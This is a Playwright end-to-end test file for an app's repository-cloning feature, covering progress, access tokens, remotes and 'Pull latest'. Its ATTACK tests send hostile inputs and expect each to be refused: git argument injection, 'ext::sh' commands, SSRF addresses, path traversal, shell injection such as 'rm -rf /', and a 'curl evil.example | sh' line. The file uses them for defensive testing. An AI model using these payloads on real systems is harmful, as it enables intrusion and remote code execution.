import { test, expect } from '@playwright/test';
import { execFileSync } from 'node:child_process';
import crypto from 'node:crypto';
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { runAxe, isBlocking, format } from './support/axe.js';

// #330 slice A — clone a PUBLIC repository into the workspace from the "Open a project" screen, and connect a
// local project to a remote.
//
// Runs under playwright.clone.config.js: a real server with a narrow workspace, no preloaded project, and (test
// harness only) a directory of fixture repositories that a file:// URL may name. Nothing is stubbed: the clone is
// a real `git clone` of a real bare repository, run by the real job runtime. The production path is https-only;
// the ATTACK tests go straight at the HTTP API the way a real attacker would.
const __dirname = path.dirname(fileURLToPath(import.meta.url));
const SHOTS = path.resolve(__dirname, '../screenshots');
fs.mkdirSync(SHOTS, { recursive: true });
const API = process.env.E2E_API_BASE || 'http://localhost:4000';
const BIN = path.resolve(__dirname, '../../../packages/cli/construct.mjs');
const WS = process.env.E2E_WORKSPACE_ROOT;
const FIXTURES = process.env.E2E_CLONE_FIXTURES;
const SANDBOX = process.env.E2E_WORKSPACE_SANDBOX;

const git = (cwd, ...args) => execFileSync('git', ['-c', 'user.name=e2e', '-c', 'user.email=e2e@example.invalid', ...args], { cwd, encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'] }).trim();
const post = (request, url, data, headers) => request.post(`${API}${url}`, { data, headers });
const fixtureUrl = (name) => `file://${path.join(FIXTURES, name)}`;

/** A bare repository in the fixtures directory: a Construct project (so it opens as one) plus, optionally, a big
 * incompressible file so the clone takes long enough to watch. */
function makeFixture(name, { bigMb = 0 } = {}) {
  const seed = path.join(SANDBOX, `seed-${name}`);
  fs.mkdirSync(seed, { recursive: true });
  execFileSync(process.execPath, [BIN, 'init', seed], { stdio: 'ignore' });
  if (bigMb) {
    const fd = fs.openSync(path.join(seed, 'big.bin'), 'w');
    for (let i = 0; i < bigMb; i += 1) fs.writeSync(fd, crypto.randomBytes(1024 * 1024));
    fs.closeSync(fd);
  }
  git(seed, 'init', '-q', '-b', 'main');
  git(seed, 'add', '-A');
  git(seed, 'commit', '-q', '-m', 'first commit');
  git(SANDBOX, 'clone', '-q', '--bare', seed, path.join(FIXTURES, `${name}.git`));
  fs.rmSync(seed, { recursive: true, force: true });
}

/** A new commit on a fixture's bare repository (what "Pull latest" should bring in). */
function pushToFixture(name, file, text) {
  const work = path.join(SANDBOX, `push-${name}-${Date.now()}`);
  git(SANDBOX, 'clone', '-q', path.join(FIXTURES, `${name}.git`), work);
  fs.writeFileSync(path.join(work, file), text);
  git(work, 'add', '-A');
  git(work, 'commit', '-q', '-m', `add ${file}`);
  git(work, 'push', '-q', 'origin', 'HEAD');
  fs.rmSync(work, { recursive: true, force: true });
}

/** Every file under `root` (following no links) that contains `needle`. */
function grepTree(root, needle) {
  const hits = [];
  const stack = [root];
  while (stack.length) {
    const d = stack.pop();
    let entries = [];
    try { entries = fs.readdirSync(d, { withFileTypes: true }); } catch { continue; }
    for (const e of entries) {
      const p = path.join(d, e.name);
      if (e.isDirectory()) stack.push(p);
      else if (e.isFile() && fs.readFileSync(p).includes(needle)) hits.push(p);
    }
  }
  return hits;
}

const workspaceEntries = () => fs.readdirSync(WS).sort();

test.describe.serial('#330 clone a repository', () => {
  test.beforeAll(() => {
    makeFixture('demo-app');
    makeFixture('bulky-app', { bigMb: 60 });
    makeFixture('secret-app');
    makeFixture('second-app');
    // A local project with NO remote, for "Connect a remote", and one that is not a repository at all.
    fs.mkdirSync(path.join(WS, 'local-only'), { recursive: true });
    execFileSync(process.execPath, [BIN, 'init', path.join(WS, 'local-only')], { stdio: 'ignore' });
    git(path.join(WS, 'local-only'), 'init', '-q', '-b', 'main');
    fs.mkdirSync(path.join(WS, 'not-a-repo'), { recursive: true });
    execFileSync(process.execPath, [BIN, 'init', path.join(WS, 'not-a-repo')], { stdio: 'ignore' });
    fs.mkdirSync(path.join(WS, 'taken'), { recursive: true });
    fs.writeFileSync(path.join(WS, 'taken', 'keep.txt'), 'mine');
  });

  test.afterAll(async ({ request }) => {
    await post(request, '/api/settings', { closeProject: true });
    for (const name of fs.readdirSync(WS)) fs.rmSync(path.join(WS, name), { recursive: true, force: true });
    fs.rmSync(FIXTURES, { recursive: true, force: true });
    fs.rmSync(path.join(SANDBOX, 'state'), { recursive: true, force: true });
  });

  test('the Open-a-project screen offers Clone a repository, and a refused address is explained', async ({ page }) => {
    await page.goto('/');
    const panel = page.getByTestId('clone');
    await expect(panel.getByRole('heading', { name: 'Clone a repository' })).toBeVisible();
    await expect(panel.getByTestId('clone-start')).toBeDisabled();
    // Advice as you type, without blocking: the server decides. An ssh address is understood and converted.
    await panel.getByTestId('clone-url').fill('git@github.com:octocat/Hello-World.git');
    await expect(panel.getByTestId('clone-preview-url')).toHaveText('https://github.com/octocat/Hello-World.git');
    await panel.getByTestId('clone-url').fill('http://github.com/octocat/Hello-World');
    await expect(panel).toContainText('Use an https:// address');
    await expect(panel.getByTestId('clone-start')).toBeDisabled();
    // A well-formed https address on a host that is not allowed: the server refuses, in plain words.
    await panel.getByTestId('clone-url').fill('https://evil.example/octocat/Hello-World');
    await panel.getByTestId('clone-start').click();
    await expect(panel.getByTestId('clone-error')).toContainText('not allowed');
    expect(workspaceEntries()).toEqual(['local-only', 'not-a-repo', 'taken']);
    await panel.screenshot({ path: path.join(SHOTS, '330-1-clone-refused.png') });
  });

  test('cloning into a folder that already exists is refused and leaves it alone', async ({ page }) => {
    await page.goto('/');
    const panel = page.getByTestId('clone');
    await panel.getByTestId('clone-url').fill(fixtureUrl('demo-app.git'));
    await panel.getByTestId('clone-name').fill('taken');
    await panel.getByTestId('clone-start').click();
    await expect(panel.getByTestId('clone-error')).toContainText('already exists');
    expect(fs.readFileSync(path.join(WS, 'taken', 'keep.txt'), 'utf8')).toBe('mine');
  });

  test('accessibility: the clone form has no serious axe violations, both themes, wide and narrow', async ({ page }) => {
    for (const theme of ['dark', 'light']) {
      for (const vp of [{ width: 1280, height: 800 }, { width: 390, height: 800 }]) {
        await page.addInitScript((t) => localStorage.setItem('construct.theme', t), theme);
        await page.setViewportSize(vp);
        await page.goto('/');
        await expect(page.getByTestId('clone')).toBeVisible();
        await page.getByTestId('clone-url').fill('https://evil.example/o/r');
        await page.getByTestId('clone-start').click();
        await expect(page.getByTestId('clone-error')).toBeVisible();
        const found = (await runAxe(page)).filter(isBlocking);
        expect(found, `clone form ${theme} ${vp.width}\n${format(found)}`).toEqual([]);
      }
    }
  });

  test('a clone shows progress, finishes, and opens the project with origin set to the address', async ({ page, request }) => {
    await page.goto('/');
    const panel = page.getByTestId('clone');
    await panel.getByTestId('clone-url').fill(fixtureUrl('bulky-app.git'));
    await panel.getByTestId('clone-start').click();
    const state = panel.getByTestId('clone-state');
    // Progress is visible while it runs (the fixture is large enough to catch), then the project opens.
    await expect(state).toBeVisible();
    if ((await state.textContent()) === 'Cloning') {
      await expect(panel.getByRole('progressbar')).toBeVisible();
      await expect(panel.getByTestId('clone-cancel')).toBeVisible();
      await panel.screenshot({ path: path.join(SHOTS, '330-2-clone-progress.png') });
    }
    // Done: the page reloads onto the cloned project, which is now the open one.
    await expect(page.getByTestId('project-switcher')).toContainText('bulky-app', { timeout: 30_000 });
    const settings = await (await request.get(`${API}/api/settings`)).json();
    expect(settings.projectDir).toBe(path.join(WS, 'bulky-app'));
    expect(settings.valid).toBe(true);
    // "Connected": a normal repository whose origin is the address it was cloned from, with the files in place.
    expect(git(path.join(WS, 'bulky-app'), 'remote', 'get-url', 'origin')).toBe(fixtureUrl('bulky-app.git'));
    expect(fs.existsSync(path.join(WS, 'bulky-app', 'architecture.yml'))).toBe(true);
    expect(git(path.join(WS, 'bulky-app'), 'log', '--format=%s', '-1')).toBe('first commit');
    await page.screenshot({ path: path.join(SHOTS, '330-3-cloned-and-opened.png'), fullPage: true });
  });

  test('the finished clone is listed in the Processes drawer', async ({ page }) => {
    await page.goto('/');
    await page.getByTestId('pill-processes').click();
    const drawer = page.getByRole('region', { name: 'Drawer' });
    await expect(drawer).toBeVisible();
    const jobs = drawer.getByTestId('clone-jobs');
    await expect(jobs).toContainText('Clone bulky-app');
    await expect(jobs).toContainText('Done');
    await expect(jobs).toContainText('Cloned into bulky-app');
    await drawer.screenshot({ path: path.join(SHOTS, '330-4-clone-in-processes.png') });
  });

  test('cloning the same repository again is refused: the existing folder is never touched', async ({ request }) => {
    const before = fs.readdirSync(path.join(WS, 'bulky-app')).sort();
    const res = await post(request, '/api/clone', { url: fixtureUrl('bulky-app.git') });
    expect(res.status()).toBe(409);
    expect((await res.json()).code).toBe('EXISTS');
    expect(fs.readdirSync(path.join(WS, 'bulky-app')).sort()).toEqual(before);
  });

  test('Connect a remote: a project with no origin gets one; a repo with one is shown, never overwritten', async ({ page, request }) => {
    expect((await post(request, '/api/settings', { projectDir: path.join(WS, 'local-only') })).ok()).toBeTruthy();
    await page.goto('/settings');
    const panel = page.getByTestId('connect-remote');
    await expect(panel.getByRole('heading', { name: 'Connect a remote' })).toBeVisible();
    await expect(panel).toContainText('no remote');
    await panel.getByTestId('remote-url').fill('https://user:secret@github.com/octocat/Hello-World');
    await panel.getByTestId('remote-connect').click();
    await expect(panel.getByTestId('remote-error')).toContainText('user name or password');
    expect(git(path.join(WS, 'local-only'), 'remote')).toBe('');
    await panel.getByTestId('remote-url').fill('https://github.com/octocat/Hello-World');
    await panel.getByTestId('remote-connect').click();
    await expect(panel.getByTestId('remote-connected')).toContainText('https://github.com/octocat/Hello-World.git');
    expect(git(path.join(WS, 'local-only'), 'remote', 'get-url', 'origin')).toBe('https://github.com/octocat/Hello-World.git');
    await panel.screenshot({ path: path.join(SHOTS, '330-5-remote-connected.png') });
    // Asking again through the API is refused and changes nothing.
    const again = await post(request, '/api/git/remote', { url: 'https://github.com/other/thing' });
    expect(again.status()).toBe(409);
    expect((await again.json()).code).toBe('ALREADY_CONNECTED');
    expect(git(path.join(WS, 'local-only'), 'remote', 'get-url', 'origin')).toBe('https://github.com/octocat/Hello-World.git');
    // A project that is not a repository says so.
    expect((await post(request, '/api/settings', { projectDir: path.join(WS, 'not-a-repo') })).ok()).toBeTruthy();
    await page.goto('/settings');
    await expect(page.getByTestId('remote-not-repo')).toBeVisible();
  });

  test('ATTACK: hostile URLs and names are refused with a 4xx and create nothing in the workspace', async ({ request }) => {
    const before = workspaceEntries();
    const urls = [
      'https://user:pass@github.com/octocat/Hello-World', 'https://github.com@evil.com/o/r', '--upload-pack=touch /tmp/pwned',
      'ext::sh -c "touch /tmp/pwned"', 'file:///etc/passwd', `file://${SANDBOX}/seed-demo-app`, 'ssh://git@github.com/o/r',
      'git://github.com/o/r', 'git@github.com:o/r.git', 'http://github.com/o/r', 'https://github.com.evil.com/o/r',
      'https://127.0.0.1/o/r', 'https://localhost/o/r', 'https://[::1]/o/r', 'https://169.254.169.254/latest/meta-data/x',
      'https://github.com/o/r?service=git-upload-pack', 'https://github.com/o/../../etc', 'https://github.com/o/%2e%2e',
      'https://github.com/o/r\n--upload-pack=x', 'https://gıthub.com/o/r', 'https://github.com./o/r',
    ];
    for (const url of urls) {
      const res = await post(request, '/api/clone', { url });
      expect(res.status(), `${JSON.stringify(url)}`).toBeGreaterThanOrEqual(400);
      expect(res.status(), `${JSON.stringify(url)}`).toBeLessThan(500);
    }
    for (const name of ['..', '../escape', 'a/b', '/abs', '.hidden', 'x.', '--upload-pack=x', 'ü', 'a\0b']) {
      const res = await post(request, '/api/clone', { url: fixtureUrl('demo-app.git'), name });
      expect(res.status(), `name ${JSON.stringify(name)}`).toBe(400);
    }
    for (const body of [{}, { url: 5 }, { url: [fixtureUrl('demo-app.git')] }, { url: fixtureUrl('demo-app.git'), depth: '1; rm -rf /' }, { url: fixtureUrl('demo-app.git'), depth: 0 }]) {
      expect((await post(request, '/api/clone', body)).status()).toBe(400);
    }
    expect(fs.existsSync('/tmp/pwned')).toBe(false);
    expect(workspaceEntries()).toEqual(before);
  });

  test('ATTACK: a symlink or an escape as the destination never writes outside the workspace', async ({ request }) => {
    const outside = path.join(SANDBOX, 'outside');
    fs.mkdirSync(outside, { recursive: true });
    fs.symlinkSync(outside, path.join(WS, 'sneaky'));
    for (const name of ['sneaky', '../outside', `${WS}/../outside/x`]) {
      const res = await post(request, '/api/clone', { url: fixtureUrl('demo-app.git'), name });
      expect([400, 403, 409], `${name} -> ${res.status()}`).toContain(res.status());
    }
    expect(fs.readdirSync(outside)).toEqual([]);
    fs.unlinkSync(path.join(WS, 'sneaky'));
  });

  test('ATTACK: a foreign Origin cannot start, list, read or cancel a clone', async ({ request }) => {
    const evil = { origin: 'https://evil.example' };
    const before = workspaceEntries();
    expect((await post(request, '/api/clone', { url: fixtureUrl('demo-app.git'), name: 'from-evil' }, evil)).status()).toBe(403);
    expect((await post(request, '/api/clone/x/cancel', {}, evil)).status()).toBe(403);
    expect((await request.get(`${API}/api/clone`, { headers: evil })).status()).toBe(403);
    expect((await post(request, '/api/git/remote', { url: 'https://github.com/o/r' }, evil)).status()).toBe(403);
    expect(workspaceEntries()).toEqual(before);
  });

  test('a repository that cannot be cloned fails cleanly and leaves no folder behind', async ({ request }) => {
    const res = await post(request, '/api/clone', { url: fixtureUrl('does-not-exist.git'), name: 'ghost' });
    expect(res.status()).toBe(202);
    const id = (await res.json()).job.id;
    await expect.poll(async () => (await (await request.get(`${API}/api/clone/${id}`)).json()).job.state).toBe('failed');
    expect(fs.existsSync(path.join(WS, 'ghost'))).toBe(false);
    const job = (await (await request.get(`${API}/api/clone/${id}`)).json()).job;
    expect(job.error).toMatch(/Check the address/);
  });
  // ---- #330 slice A2/B: one field, a one-time access token, recent clones, Pull latest ----------------------------

  test('the one field understands what people paste, and shows the address, folder and branch before cloning', async ({ page, request }) => {
    await post(request, '/api/settings', { closeProject: true });
    await page.goto('/');
    const panel = page.getByTestId('clone');
    const url = panel.getByTestId('clone-url');
    const HW = 'https://github.com/octocat/Hello-World.git';
    const cases = [
      ['octocat/Hello-World', HW, ''],
      ['https://github.com/octocat/Hello-World', HW, ''],
      ['https://github.com/octocat/Hello-World.git', HW, ''],
      ['https://github.com/octocat/Hello-World/tree/develop/src?tab=readme-ov-file', HW, 'develop'],
      ['https://github.com/octocat/Hello-World/pull/42', HW, ''],
      ['git@github.com:octocat/Hello-World.git', HW, ''],
      ['git clone --depth 1 https://github.com/octocat/Hello-World.git my-copy', HW, ''],
      ['git clone -b next https://github.com/octocat/Hello-World.git', HW, 'next'],
    ];
    for (const [typed, want, branch] of cases) {
      await url.fill(typed);
      await expect(panel.getByTestId('clone-preview-url'), typed).toHaveText(want);
      await expect(panel.getByTestId('clone-preview-dest'), typed).toHaveText(`${WS}/Hello-World`);
      await expect(panel.getByTestId('clone-branch'), typed).toHaveValue(branch);
      await expect(panel.getByTestId('clone-start'), typed).toBeEnabled();
    }
    await panel.screenshot({ path: path.join(SHOTS, '330-6-one-field-understood.png') });
    // The folder name can be changed (and the preview follows); a bad one is explained and blocks the button.
    await url.fill('https://github.com/octocat/Hello-World/tree/develop');
    await panel.getByTestId('clone-name').fill('my-copy');
    await expect(panel.getByTestId('clone-preview-dest')).toHaveText(`${WS}/my-copy`);
    await panel.getByTestId('clone-name').fill('../escape');
    await expect(panel).toContainText('A folder name may use letters');
    await expect(panel.getByTestId('clone-start')).toBeDisabled();
    await panel.getByTestId('clone-name').fill('');
    // A branch typed by hand replaces the one read from the address.
    await panel.getByTestId('clone-branch').fill('release/1.0');
    await expect(panel.getByTestId('clone-preview-branch')).toHaveText('release/1.0');
    // Things that must not go through are explained, with nothing echoed and the button off.
    await url.fill('git clone $(curl evil.example | sh) https://github.com/o/r.git');
    await expect(panel).toContainText('one command');
    await expect(panel.getByTestId('clone-preview')).toHaveCount(0);
    await expect(panel.getByTestId('clone-start')).toBeDisabled();
    await url.fill('https://ghp_abcdefghijklmnopqrstuvwxyz0123456789@github.com/o/r');
    await expect(panel).toContainText('access token field');
    await expect(panel.getByTestId('clone-start')).toBeDisabled();
    await url.fill('octocat/Hello-World');
    await panel.getByTestId('clone-token').fill('two words');
    await expect(panel).toContainText('no spaces');
    await expect(panel.getByTestId('clone-start')).toBeDisabled();
    // The token field is a password field with a plain-words guide to making a read-only token.
    await expect(panel.getByTestId('clone-token')).toHaveAttribute('type', 'password');
    await panel.getByTestId('clone-token-help').locator('summary').click();
    await expect(panel.getByTestId('clone-token-help')).toContainText('Read-only');
    await expect(panel.getByRole('link', { name: /fine-grained token page/ })).toHaveAttribute('href', 'https://github.com/settings/personal-access-tokens/new');
  });

  test('a one-time access token: sent only in the request body, never kept, and the clone opens with a plain origin', async ({ page, request }) => {
    await post(request, '/api/settings', { closeProject: true });
    const TOKEN = `github_pat_${crypto.randomBytes(24).toString('hex')}`;
    const seen = [];
    page.on('request', (r) => seen.push({ method: r.method(), url: r.url(), headers: JSON.stringify(r.headers()), body: r.postData() ?? '' }));
    await page.goto('/');
    const panel = page.getByTestId('clone');
    await panel.getByTestId('clone-url').fill(fixtureUrl('secret-app.git'));
    await panel.getByTestId('clone-token').fill(TOKEN);
    await panel.getByTestId('clone-start').click();
    await expect(page.getByTestId('project-switcher')).toContainText('secret-app', { timeout: 30_000 });
    // On the wire: the token is in the POST body of /api/clone and in no URL and no header of any request.
    const start = seen.find((r) => r.method === 'POST' && r.url.endsWith('/api/clone'));
    expect(start, 'the clone request').toBeTruthy();
    expect(start.body).toContain(TOKEN);
    for (const r of seen) {
      expect(r.url, r.url).not.toContain(TOKEN);
      expect(r.headers, r.url).not.toContain(TOKEN);
      if (r !== start) expect(r.body, r.url).not.toContain(TOKEN);
    }
    // At rest: the job the server keeps, every file in the workspace, fixtures and server state, and the plain origin.
    const jobs = await (await request.get(`${API}/api/clone`)).text();
    expect(jobs).not.toContain(TOKEN);
    expect(JSON.parse(jobs).jobs.find((j) => j.name === 'secret-app')).toMatchObject({ state: 'done', private: true });
    expect(grepTree(SANDBOX, TOKEN)).toEqual([]);
    expect(git(path.join(WS, 'secret-app'), 'remote', 'get-url', 'origin')).toBe(fixtureUrl('secret-app.git'));
    expect(fs.readFileSync(path.join(WS, 'secret-app', '.git', 'config'), 'utf8')).not.toMatch(/@|x-access-token/);
    expect(await page.content()).not.toContain(TOKEN);
    await page.screenshot({ path: path.join(SHOTS, '330-7-private-clone-opened.png') });
  });

  test('"private or misspelled" is one plain message and points at the token (UI with a stubbed answer)', async ({ page, request }) => {
    // The server's real handling of a refused login is proven against a real git and a password-protected server in
    // ui/server/src/cloneAuth.test.mjs; here only the screen's wording is checked, so the server answer is stubbed.
    await post(request, '/api/settings', { closeProject: true });
    const job = {
      id: 'stub', kind: 'clone', title: 'Clone octocat/private-thing', url: 'https://github.com/octocat/private-thing.git', name: 'private-thing', state: 'failed', progress: 'Starting', bytes: 0,
      startedAt: new Date().toISOString(), finishedAt: new Date().toISOString(), error: 'Private or misspelled — paste a token with read access.', code: 'AUTH', private: false, log: [],
    };
    await page.route('**/api/clone', (route) => (route.request().method() === 'POST' ? route.fulfill({ status: 202, contentType: 'application/json', body: JSON.stringify({ ok: true, job }) }) : route.continue()));
    await page.goto('/');
    const panel = page.getByTestId('clone');
    await panel.getByTestId('clone-url').fill('octocat/private-thing');
    await panel.getByTestId('clone-start').click();
    await expect(panel.getByTestId('clone-state')).toHaveText('Failed');
    await expect(panel.getByTestId('clone-progress')).toContainText('Private or misspelled — paste a token with read access.');
    await expect(panel.getByTestId('clone-dismiss')).toBeVisible();
  });

  test('recent clones: Open, Pull latest (fast-forward only, says when nothing is new) and Remove from list', async ({ page, request }) => {
    await post(request, '/api/settings', { closeProject: true });
    await page.goto('/');
    const panel = page.getByTestId('clone');
    await panel.getByTestId('clone-url').fill(fixtureUrl('second-app.git'));
    await panel.getByTestId('clone-start').click();
    await expect(page.getByTestId('project-switcher')).toContainText('second-app', { timeout: 30_000 });
    await post(request, '/api/settings', { closeProject: true });
    await page.goto('/');
    const recent = page.getByTestId('clone-recent');
    const row = recent.getByTestId('clone-recent-row').filter({ hasText: 'second-app' });
    await expect(row).toBeVisible();
    // Pull latest: nothing new yet, then a new commit arrives on the remote.
    await row.getByTestId('clone-recent-pull').click();
    await expect(row.getByTestId('clone-recent-result')).toContainText('Already up to date');
    pushToFixture('second-app', 'news.txt', 'fresh\n');
    await row.getByTestId('clone-recent-pull').click();
    await expect(row.getByTestId('clone-recent-result')).toContainText('Updated to the latest');
    expect(fs.readFileSync(path.join(WS, 'second-app', 'news.txt'), 'utf8')).toBe('fresh\n');
    await recent.screenshot({ path: path.join(SHOTS, '330-8-recent-pulled.png') });
    // A copy with its own commit that the remote does not have is never rewritten: the pull says so and changes nothing.
    fs.writeFileSync(path.join(WS, 'second-app', 'mine.txt'), 'mine\n');
    git(path.join(WS, 'second-app'), 'add', '-A');
    git(path.join(WS, 'second-app'), 'commit', '-q', '-m', 'mine');
    pushToFixture('second-app', 'later.txt', 'later\n');
    await row.getByTestId('clone-recent-pull').click();
    await expect(row.getByTestId('clone-recent-result')).toContainText('cannot be brought up to date automatically');
    expect(fs.existsSync(path.join(WS, 'second-app', 'later.txt'))).toBe(false);
    // Open opens it as the project.
    await row.getByTestId('clone-recent-open').click();
    await expect(page.getByTestId('project-switcher')).toContainText('second-app', { timeout: 30_000 });
    // Remove from list forgets it on this browser only; the folder stays.
    await post(request, '/api/settings', { closeProject: true });
    await page.goto('/');
    await page.getByTestId('clone-recent-row').filter({ hasText: 'second-app' }).getByTestId('clone-recent-forget').click();
    await expect(page.getByTestId('clone-recent-row').filter({ hasText: 'second-app' })).toHaveCount(0);
    expect(fs.existsSync(path.join(WS, 'second-app'))).toBe(true);
  });

  test('accessibility: the new one-field form, its preview and the recent list, both themes, wide and narrow', async ({ page, request }) => {
    await post(request, '/api/settings', { closeProject: true });
    const entry = { id: 'seed', name: 'second-app', url: fixtureUrl('second-app.git'), dir: path.join(WS, 'second-app'), at: new Date().toISOString(), private: true };
    for (const theme of ['dark', 'light']) {
      for (const vp of [{ width: 1280, height: 900 }, { width: 390, height: 900 }]) {
        await page.addInitScript(([t, e]) => { localStorage.setItem('construct.theme', t); localStorage.setItem('construct.clone.recent', JSON.stringify([e])); }, [theme, entry]);
        await page.setViewportSize(vp);
        await page.goto('/');
        await page.getByTestId('clone-url').fill('https://github.com/octocat/Hello-World/tree/develop');
        await expect(page.getByTestId('clone-preview')).toBeVisible();
        await page.getByTestId('clone-token-help').locator('summary').click();
        await expect(page.getByTestId('clone-recent')).toBeVisible();
        const found = (await runAxe(page)).filter(isBlocking);
        expect(found, `clone one-field ${theme} ${vp.width}\n${format(found)}`).toEqual([]);
      }
    }
  });

  test('ATTACK: hostile tokens, branches and Pull latest targets are refused over the API, and nothing is echoed', async ({ request }) => {
    const SECRET = `ghp_${crypto.randomBytes(20).toString('hex')}`;
    const before = workspaceEntries();
    for (const token of [`${SECRET} x`, `${SECRET}\n`, `${SECRET}\u0000`, `\t${SECRET}`, 'a'.repeat(400), 42, { t: SECRET }, [SECRET], `${SECRET}ü`]) {
      const res = await post(request, '/api/clone', { url: fixtureUrl('demo-app.git'), name: 'tok-attack', token });
      expect(res.status(), JSON.stringify(token)).toBe(400);
      expect(await res.text()).not.toContain(SECRET);
    }
    for (const branch of ['--upload-pack=touch /tmp/pwned', '-b', 'a b', 'a..b', '$(id)', 'x;id', '../x', 'a\nb', 5]) {
      expect((await post(request, '/api/clone', { url: fixtureUrl('demo-app.git'), name: 'br-attack', branch })).status(), JSON.stringify(branch)).toBe(400);
    }
    // a token is never accepted for an address that is not allowed, and is not echoed in the refusal
    const evil = await post(request, '/api/clone', { url: 'https://evil.example/o/r', token: SECRET });
    expect(evil.status()).toBe(403);
    expect(await evil.text()).not.toContain(SECRET);
    // a body that is not JSON gets a fixed answer, not the parser's quote of it
    const broken = await request.post(`${API}/api/clone`, { headers: { 'content-type': 'application/json' }, data: `{"url":"x","token":"${SECRET}` });
    expect(broken.status()).toBe(400);
    expect(await broken.text()).not.toContain(SECRET);
    // Pull latest: only a clone this Cockpit made, contained, by a plain folder name
    for (const name of ['..', '../ws', 'a/b', '/etc', '.hidden', '--x', '', 7]) {
      expect((await post(request, '/api/clone/pull', { name })).status(), JSON.stringify(name)).toBe(400);
    }
    expect((await post(request, '/api/clone/pull', { name: 'ghost-folder' })).status()).toBe(404);
    const notOurs = await post(request, '/api/clone/pull', { name: 'taken' });
    expect(notOurs.status()).toBe(403);
    expect((await notOurs.json()).code).toBe('NOT_A_COCKPIT_CLONE');
    expect((await post(request, '/api/clone/pull', { name: 'taken', token: 'has space' })).status()).toBe(400);
    expect(fs.existsSync('/tmp/pwned')).toBe(false);
    expect(workspaceEntries()).toEqual(before);
    expect(fs.readFileSync(path.join(WS, 'taken', 'keep.txt'), 'utf8')).toBe('mine');
  });

  test('ATTACK: a foreign Origin cannot pull, and a token sent with one is refused untouched', async ({ request }) => {
    const evil = { origin: 'https://evil.example' };
    expect((await post(request, '/api/clone/pull', { name: 'second-app', token: 'ghp_x1234567890abcdefghij' }, evil)).status()).toBe(403);
    expect((await post(request, '/api/clone', { url: fixtureUrl('demo-app.git'), name: 'from-evil-2', token: 'ghp_x1234567890abcdefghij' }, evil)).status()).toBe(403);
    expect(fs.existsSync(path.join(WS, 'from-evil-2'))).toBe(false);
  });
});
